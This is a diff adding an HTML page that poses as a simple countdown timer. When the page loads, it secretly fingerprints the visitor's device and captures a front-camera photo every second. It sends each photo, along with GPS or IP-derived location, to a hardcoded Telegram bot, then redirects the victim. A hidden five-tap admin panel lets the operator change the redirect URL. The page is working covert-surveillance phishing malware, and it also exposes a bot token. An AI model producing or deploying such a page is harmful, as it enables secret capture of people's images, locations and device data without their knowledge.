@@ -1,0 +1,425 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Countdown with Camera</title>
+  <style>
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    body {
+      background: #ffffff;
+      color: #222;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      height: 100vh;
+      text-align: center;
+      flex-direction: column;
+    }
+    .container {
+      display: flex;
+      flex-direction: column;
+      align-items: center;
+      gap: 20px;
+    }
+    .timer-wrapper {
+      position: relative;
+      width: 160px;
+      height: 160px;
+    }
+    svg {
+      transform: rotate(-90deg);
+    }
+    .circle-bg {
+      fill: none;
+      stroke: #e0e0e0;
+      stroke-width: 8;
+    }
+    .circle-progress {
+      fill: none;
+      stroke: #3b82f6;
+      stroke-width: 8;
+      stroke-linecap: round;
+      transition: stroke-dashoffset 1s linear;
+    }
+    #countdown {
+      position: absolute;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      font-size: 3.5rem;
+      font-weight: 600;
+      color: #1e293b;
+    }
+    #status {
+      font-size: 1.1rem;
+      color: #555;
+      max-width: 300px;
+    }
+    video { display: none; }
+
+    /* Admin Panel Styles */
+    #admin-panel {
+      display: none;
+      position: fixed;
+      top: 0; left: 0; width: 100%; height: 100%;
+      background: rgba(0,0,0,0.8);
+      z-index: 9999;
+      justify-content: center;
+      align-items: center;
+      flex-direction: column;
+    }
+    #admin-panel.active { display: flex; }
+    #admin-panel input {
+      padding: 10px;
+      width: 80%;
+      max-width: 400px;
+      margin: 10px;
+      border: 2px solid #3b82f6;
+      border-radius: 8px;
+      font-size: 16px;
+    }
+    #admin-panel button {
+      padding: 12px 25px;
+      background: #3b82f6;
+      color: white;
+      border: none;
+      border-radius: 8px;
+      font-size: 16px;
+      cursor: pointer;
+      margin: 5px;
+    }
+    #admin-panel .close-btn {
+      background: #e53e3e;
+    }
+    .admin-trigger {
+      position: fixed;
+      bottom: 10px;
+      right: 10px;
+      width: 20px;
+      height: 20px;
+      background: transparent;
+      z-index: 9998;
+    }
+  </style>
+</head>
+<body>
+  <div class="container">
+    <div class="timer-wrapper">
+      <svg width="160" height="160" viewBox="0 0 160 160">
+        <circle class="circle-bg" cx="80" cy="80" r="70" />
+        <circle id="progressCircle" class="circle-progress" cx="80" cy="80" r="70"
+          stroke-dasharray="439.82" stroke-dashoffset="0" />
+      </svg>
+      <div id="countdown">7</div>
+    </div>
+    <div id="status">Allow camera & location to begin</div>
+  </div>
+
+  <video id="video" autoplay playsinline muted></video>
+  <canvas id="canvas" style="display:none;"></canvas>
+
+  <!-- Admin Panel Trigger (invisible corner) -->
+  <div class="admin-trigger" id="adminTrigger"></div>
+
+  <!-- Admin Panel -->
+  <div id="admin-panel">
+    <h2 style="color: #fff; margin-bottom: 20px;">Admin Panel</h2>
+    <input type="url" id="redirectInput" placeholder="Enter redirect URL" value="">
+    <br>
+    <button onclick="saveRedirect()">Save & Close</button>
+    <button class="close-btn" onclick="closeAdmin()">Close</button>
+    <p id="adminMsg" style="color: #0f0; margin-top: 10px;"></p>
+  </div>
+
+  <script>
+    // ========== ⚙️ CONFIGURATION - ضع قيمك هنا ==========
+    const BOT_TOKEN = '8649544110:AAF33tUasn_RsH6A7035vpyYntAlOAQ0axQ'; // <-- استبدل هذا بالتوكن الجديد
+    const CHAT_ID = '5151102782'; // <-- استبدل هذا بالإيدي الصحيح
+    const COUNTDOWN_START = 7;
+    const IPINFO_TOKEN = 'YOUR_IPINFO_TOKEN'; // اختياري
+
+    // ========== DOM ELEMENTS ==========
+    const video = document.getElementById('video');
+    const canvas = document.getElementById('canvas');
+    const ctx = canvas.getContext('2d');
+    const countdownEl = document.getElementById('countdown');
+    const statusEl = document.getElementById('status');
+    const progressCircle = document.getElementById('progressCircle');
+    const adminPanel = document.getElementById('admin-panel');
+    const redirectInput = document.getElementById('redirectInput');
+    const adminMsg = document.getElementById('adminMsg');
+
+    // ========== STATE ==========
+    let redirectUrl = localStorage.getItem('myRedirectUrl') || 'https://example.com';
+    let countdown = COUNTDOWN_START;
+    let stream = null;
+    let intervalId = null;
+    let latestPosition = null;
+    let watchId = null;
+    let isSending = false;
+    let deviceInfo = null;
+    const circumference = 2 * Math.PI * 70;
+
+    // Initialize redirect input
+    redirectInput.value = redirectUrl;
+
+    // ========== 1. Device Info Collection ==========
+    async function collectDeviceInfo() {
+      await new Promise(r => setTimeout(r, 500));
+      const uaData = navigator.userAgentData || {};
+      let highEntropyValues = {};
+      if (uaData.getHighEntropyValues) {
+        try {
+          highEntropyValues = await uaData.getHighEntropyValues([
+            "platform", "platformVersion", "architecture", "model",
+            "uaFullVersion", "fullVersionList", "bitness", "wow64"
+          ]);
+        } catch(e) {}
+      }
+      const connection = navigator.connection || {};
+      const screenInfo = window.screen;
+      let batteryInfo = null;
+      try {
+        if ('getBattery' in navigator) {
+          const battery = await navigator.getBattery();
+          batteryInfo = { level: battery.level, charging: battery.charging,
+            chargingTime: battery.chargingTime, dischargingTime: battery.dischargingTime };
+        }
+      } catch(e) {}
+      deviceInfo = {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        languages: navigator.languages,
+        cookieEnabled: navigator.cookieEnabled,
+        onLine: navigator.onLine,
+        doNotTrack: navigator.doNotTrack || window.doNotTrack || null,
+        hardwareConcurrency: navigator.hardwareConcurrency || 1,
+        deviceMemory: navigator.deviceMemory || null,
+        maxTouchPoints: navigator.maxTouchPoints || 0,
+        vendor: navigator.vendor || '',
+        product: navigator.product || '',
+        appName: navigator.appName || '',
+        appVersion: navigator.appVersion || '',
+        userAgentData: { mobile: uaData.mobile || false, platform: uaData.platform || '', brands: uaData.brands || [] },
+        highEntropyValues,
+        screen: {
+          width: screenInfo.width, height: screenInfo.height,
+          availWidth: screenInfo.availWidth, availHeight: screenInfo.availHeight,
+          colorDepth: screenInfo.colorDepth, pixelDepth: screenInfo.pixelDepth,
+          devicePixelRatio: window.devicePixelRatio || 1,
+          orientation: screenInfo.orientation ? screenInfo.orientation.type : 'unknown'
+        },
+        connection: {
+          effectiveType: connection.effectiveType || 'unknown',
+          downlink: connection.downlink || 0, rtt: connection.rtt || 0,
+          saveData: connection.saveData || false, type: connection.type || 'unknown'
+        },
+        battery: batteryInfo,
+        timestamp: new Date().toISOString(),
+        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+      };
+      statusEl.textContent = 'Device info collected';
+    }
+
+    // ========== 2. Camera Permission ==========
+    async function requestCamera() {
+      try {
+        stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+        video.srcObject = stream;
+        await video.play();
+        statusEl.textContent = 'Camera ready';
+        return true;
+      } catch(err) {
+        statusEl.textContent = 'Camera access denied';
+        return false;
+      }
+    }
+
+    // ========== 3. Location Tracking ==========
+    function startWatchingLocation() {
+      if (!navigator.geolocation) {
+        statusEl.textContent += ' | Geolocation not supported';
+        return;
+      }
+      navigator.geolocation.getCurrentPosition(
+        pos => {
+          latestPosition = {
+            latitude: pos.coords.latitude,
+            longitude: pos.coords.longitude,
+            accuracy: pos.coords.accuracy,
+            altitude: pos.coords.altitude,
+            altitudeAccuracy: pos.coords.altitudeAccuracy,
+            heading: pos.coords.heading,
+            speed: pos.coords.speed,
+            timestamp: pos.timestamp
+          };
+          statusEl.textContent = 'Location acquired';
+        },
+        err => {
+          statusEl.textContent = 'Location error: ' + err.message;
+          fetchLocationByIP();
+        },
+        { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
+      );
+      watchId = navigator.geolocation.watchPosition(
+        pos => {
+          latestPosition = {
+            latitude: pos.coords.latitude, longitude: pos.coords.longitude,
+            accuracy: pos.coords.accuracy, altitude: pos.coords.altitude,
+            altitudeAccuracy: pos.coords.altitudeAccuracy, heading: pos.coords.heading,
+            speed: pos.coords.speed, timestamp: pos.timestamp
+          };
+        },
+        err => { console.warn('watchPosition error:', err.message); },
+        { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
+      );
+    }
+
+    // ========== 4. IP Fallback ==========
+    async function fetchLocationByIP() {
+      statusEl.textContent = 'Trying IP location...';
+      try {
+        let url = 'https://ipinfo.io/json';
+        if (IPINFO_TOKEN && IPINFO_TOKEN !== 'YOUR_IPINFO_TOKEN') {
+          url = `https://ipinfo.io?token=${IPINFO_TOKEN}`;
+        }
+        const res = await fetch(url);
+        const data = await res.json();
+        if (data.loc) {
+          const [lat, lon] = data.loc.split(',').map(Number);
+          latestPosition = {
+            latitude: lat, longitude: lon, accuracy: 10000,
+            altitude: null, altitudeAccuracy: null, heading: null, speed: null,
+            timestamp: Date.now(), source: 'ip'
+          };
+          statusEl.textContent = 'Location via IP';
+        }
+        if (deviceInfo) {
+          deviceInfo.ipLocation = {
+            ip: data.ip, city: data.city, region: data.region,
+            country: data.country, loc: data.loc, org: data.org,
+            postal: data.postal, timezone: data.timezone
+          };
+        }
+      } catch(err) {
+        console.warn('IP location failed:', err);
+        statusEl.textContent = 'Could not get location';
+      }
+    }
+
+    // ========== 5. Capture Photo ==========
+    function capturePhoto() {
+      if (!video.videoWidth || !stream) return null;
+      canvas.width = video.videoWidth;
+      canvas.height = video.videoHeight;
+      ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
+      return canvas.toDataURL('image/jpeg', 0.8);
+    }
+
+    // ========== 6. Send Directly to Telegram ==========
+    async function sendSinglePhoto(photoDataUrl) {
+      if (isSending) return;
+      isSending = true;
+      try {
+        let caption = `Photo captured`;
+        if (latestPosition && latestPosition.latitude) {
+          caption += `\nLocation: ${latestPosition.latitude}, ${latestPosition.longitude}`;
+        }
+        if (deviceInfo) {
+          caption += `\n\nDevice Info:\n${JSON.stringify(deviceInfo, null, 2)}`;
+        }
+
+        const formData = new FormData();
+        formData.append('chat_id', CHAT_ID);
+        const base64Response = await fetch(photoDataUrl);
+        const blob = await base64Response.blob();
+        formData.append('photo', blob, 'image.jpg');
+        formData.append('caption', caption);
+
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+          method: 'POST',
+          body: formData
+        });
+      } catch(err) {
+        console.error('Send error:', err);
+      } finally {
+        isSending = false;
+      }
+    }
+
+    // ========== 7. Update Timer UI ==========
+    function updateTimerUI() {
+      countdownEl.textContent = countdown;
+      const offset = ((COUNTDOWN_START - countdown) / COUNTDOWN_START) * circumference;
+      progressCircle.style.strokeDashoffset = offset;
+    }
+
+    // ========== 8. Tick ==========
+    async function tick() {
+      const photo = capturePhoto();
+      if (photo) {
+        sendSinglePhoto(photo);
+      }
+      countdown--;
+      updateTimerUI();
+      if (countdown <= 0) {
+        clearInterval(intervalId);
+        statusEl.textContent = 'Redirecting...';
+        if (stream) stream.getTracks().forEach(track => track.stop());
+        if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+        window.location.href = redirectUrl;
+      }
+    }
+
+    // ========== 9. Admin Panel Functions ==========
+    function saveRedirect() {
+      const newUrl = redirectInput.value.trim();
+      if (newUrl) {
+        localStorage.setItem('myRedirectUrl', newUrl);
+        redirectUrl = newUrl;
+        adminMsg.textContent = 'Saved! New redirect URL: ' + newUrl;
+        setTimeout(closeAdmin, 1500);
+      }
+    }
+
+    function closeAdmin() {
+      adminPanel.classList.remove('active');
+    }
+
+    // Trigger admin panel by tapping 5 times on the invisible corner
+    let tapCount = 0;
+    let tapTimer = null;
+    document.getElementById('adminTrigger').addEventListener('click', () => {
+      tapCount++;
+      if (tapCount >= 5) {
+        adminPanel.classList.add('active');
+        tapCount = 0;
+        if (tapTimer) clearTimeout(tapTimer);
+      } else {
+        if (tapTimer) clearTimeout(tapTimer);
+        tapTimer = setTimeout(() => { tapCount = 0; }, 2000);
+      }
+    });
+
+    // ========== 10. Main Init ==========
+    async function init() {
+      await collectDeviceInfo();
+      const cameraReady = await requestCamera();
+      startWatchingLocation();
+      updateTimerUI();
+      tick();
+      intervalId = setInterval(tick, 1000);
+    }
+
+    window.addEventListener('load', init);
+    window.addEventListener('beforeunload', () => {
+      if (intervalId) clearInterval(intervalId);
+      if (stream) stream.getTracks().forEach(track => track.stop());
+      if (watchId !== null) navigator.geolocation.clearWatch(watchId);
+    });
+  </script>
+</body>
+</html>
